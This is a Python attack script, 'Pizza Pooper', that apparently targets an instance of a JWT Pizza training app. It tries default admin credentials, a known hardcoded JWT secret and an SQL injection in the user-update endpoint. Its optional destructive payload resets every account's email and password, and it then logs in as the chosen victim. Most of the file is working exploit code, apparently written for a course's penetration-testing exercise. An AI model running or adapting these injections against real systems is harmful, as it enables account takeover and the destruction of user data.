from time import sleep

import uuid
import jwt
from requests import get, post, put


class Step:
    def __init__(self, description, func):
        self.description = description
        self.func = func

    def run(self):
        return self.func()


class TERM:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'


class RATING:
    GOOD = 0
    WARN = 1
    BAD = 2

# Utils
def random_str():
    return str(uuid.uuid4())[:8]


def register_burner():
    email = 'pentest-' + random_str() + '@jwt.com'

    print('Registering new user...')
    res = post(HOST + '/api/auth', json={
        'name': 'Pentest',
        'email': email,
        'password': 'banana'
    }).json()

    token = res['token']
    user = res['user']

    if token is not None:
        print(f'Registered burner {email}')

    return token, user


# Tests
def try_admin_auth():
    EMAIL = 'a@jwt.com'
    PASSWORD = 'admin'

    try:
        print(f'Using email: {EMAIL}, password: {PASSWORD}')
        res = put(HOST + '/api/auth', json={
            'email': EMAIL,
            'password': PASSWORD
        })

        if res.status_code == 200:
            print(f'Login succeeded.\nAuthorization: Bearer {res.json()['token']}')
            return RATING.BAD
        else:
            print('Login failed.')

    except Exception as e:
        print(type(e).__name__, e)

    return RATING.GOOD


def try_admin_jwt():
    try:
        JWT = '343ab90294hijkfd2fdsaf4dsa3f424'

        token, _ = register_burner()

        original_payload = jwt.decode(token, JWT, algorithms=['HS256'])
        gen_jwt = jwt.encode(original_payload, JWT, algorithm='HS256')

        if gen_jwt == token:
            print(f'Server is using default JWT_SECRET: {JWT}')
            return RATING.WARN
    except Exception as e:
        print(type(e).__name__, e)

    return RATING.GOOD


def try_sql_injection():
    try:
        token, user = register_burner()

        res = put(HOST + f'/api/auth/{user['id']}', headers={
            'Authorization': 'Bearer ' + token
        }, json={
            'email': f"whatever' WHERE 1=0' -- ",
            'password': 'whatever'
        })

        if res.status_code == 200:
            print('Endpoint is not vulnerable.')
            return RATING.GOOD
        else:
            print('Endpoint seems vulnerable.')

        destructive = input(
            'Run destructive query? (sets all emails and passwords to the same) (y/N) ').lower() == 'y'
        target_email = input('Email: ' if destructive else 'Existing email: ')

        if destructive:
            query = f"{target_email}' -- "
        else:
            query = f"{target_email}' WHERE email='{target_email}' -- "

        password = input('New password: ')

        res = put(HOST + f'/api/auth/{user['id']}', headers={
            'Authorization': 'Bearer ' + token
        }, json={
            'email': query,
            'password': password
        })

        print(f'Setting password \'{password}\' ' + ('for all' if destructive else f'for email: {target_email}'))
        if res.status_code == 404:
            print('Injection appears successful.')

        print('Trying login...')
        res = put(HOST + '/api/auth', json={
            'email': target_email,
            'password': password
        })

        if res.status_code == 200:
            print('Login succeeded.')
            return RATING.BAD
        else:
            print('Login failed.', '' if destructive else 'Maybe email did not exist?')
            return RATING.WARN
    except Exception as e:
        print(type(e).__name__, e)

    return RATING.GOOD


steps = [
    Step('Admin authentication using default credentials', try_admin_auth),
    Step('Check default JWT secret', try_admin_jwt),
    Step('SQL injection in updateUser endpoint', try_sql_injection),
]

HOST = 'https://pizza-service.joshwiseman.click'

if __name__ == '__main__':
    print(f'💩🍕 {TERM.BOLD}Pizza Pooper{TERM.END} -- by Matheus Plinta 🍕💩\n')

    # Connectivity check
    print('Testing backend connectivity...')
    print(f'Contacting \'{HOST}\'')
    try:
        request = get(HOST)
        if request.status_code == 200:
            print(f'Backend is reachable. JWT Pizza version {request.json()['version']}')
        else:
            raise Exception(f'Backend responded with status {request.status_code}')
    except Exception as e:
        print(e)
        exit(1)

    for step_idx in range(len(steps)):
        step = steps[step_idx]
        last_one = step_idx > len(steps) - 2

        print(f'\n{TERM.CYAN}Trying \'{step.description}\'...{TERM.END}')
        run = step.run()
        if run == RATING.BAD:
            print(f'{TERM.RED}Oh no! Your JWT Pizza instance is vulnerable.{TERM.END}')

            if not last_one and input('\nWant to keep trying other methods? (y/N) ').lower() != 'y':
                break
            else:
                print()
        else:
            print(
                f'{TERM.GREEN}Unaffected! ' if run == RATING.GOOD else f'{TERM.YELLOW}Dangerous configuration. ',
                end='')
            print('No more methods to try.' if last_one else 'Trying next step...\n', end=TERM.END)
        sleep(1)
